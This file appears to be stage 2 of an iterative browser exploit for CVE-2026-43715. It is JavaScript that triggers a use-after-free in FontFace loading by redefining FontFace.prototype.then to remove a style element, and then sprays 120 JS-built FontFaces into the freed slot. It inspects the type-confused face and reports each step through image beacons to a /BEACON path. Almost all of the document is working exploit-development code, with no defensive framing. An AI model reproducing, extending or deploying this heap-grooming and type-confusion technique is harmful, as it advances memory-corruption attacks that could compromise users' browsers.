// p456 — CVE-2026-43715 Stage 2: inspect the JS-constructed flipped face
// Beacon prefix: V456-
//
// p455: a JS-constructed FontFace took the freed slot and its status
// flipped to 'loaded' — but its loaded promise never resolved (no
// FLIP-J, no THEN-2), unlike CSS faces in p452. The confused
// fontLoaded took a different branch on a JS wrapper.
//
// p456 maps what the confused call actually did to our object: find
// the flipped j face, dump every readable descriptor, then call
// .load() on it and hook the result. Whatever differs from a pristine
// j face is what the confused dispatch touched.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V456-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  function enc(s) { return encodeURIComponent(String(s)).slice(0, 60); }

  B('BOOT');

  window.onerror = function(msg) {
    B('ONERROR-' + enc(msg));
    return false;
  };

  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var hits = 0;
  var jfaces = [];

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      B('THEN-' + hits);
      var v = document.getElementById('v');
      if (v) {
        v.remove();
        document.body.offsetHeight;

        for (var k = 0; k < 120; k++) {
          var ff = new FontFace('j' + k, BAD);
          document.fonts.add(ff);
          jfaces.push(ff);
        }
        B('SPRAYED-' + jfaces.length);
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function inspect(ff, idx) {
    var parts = [];
    var props = ['status', 'family', 'style', 'weight', 'stretch',
                 'display', 'unicodeRange', 'variant'];
    for (var i = 0; i < props.length; i++) {
      try { parts.push(props[i] + '=' + enc(ff[props[i]])); }
      catch(e) { parts.push(props[i] + '=THROW'); }
    }
    B('INSPECT-J' + idx + '-' + parts.join('|'));

    // now poke it: does load() on the flipped face behave?
    try {
      ff.load().then(
        function() { B('LOAD-OK-J' + idx + '-S' + ff.status); },
        function(e) { B('LOAD-REJ-J' + idx + '-' + enc(e)); }
      );
    } catch(e) {
      B('LOAD-THROW-J' + idx + '-' + enc(e));
    }
  }

  function round0() {
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE'); return; }

    void face.loaded;
    B('LOAD-0');

    face.load().then(
      function() {
        B('SURVIVED-0-H' + hits);

        var flipped = -1;
        for (var k = 0; k < jfaces.length; k++) {
          var s;
          try { s = jfaces[k].status; } catch(e) { s = 'THROW'; }
          if (s !== 'unloaded') {
            flipped = k;
            B('FLIPIDX-J' + k + '-' + s);
          }
        }
        if (flipped < 0) { B('NOFLIP'); return; }

        inspect(jfaces[flipped], flipped);

        // control: a pristine face for comparison
        inspect(jfaces[(flipped + 60) % 120], (flipped + 60) % 120);
      },
      function(e) { B('NO-0-' + enc(e)); }
    );
  }

  round0();
  setTimeout(function() { B('ALIVE-3S-H' + hits); }, 3000);
})();
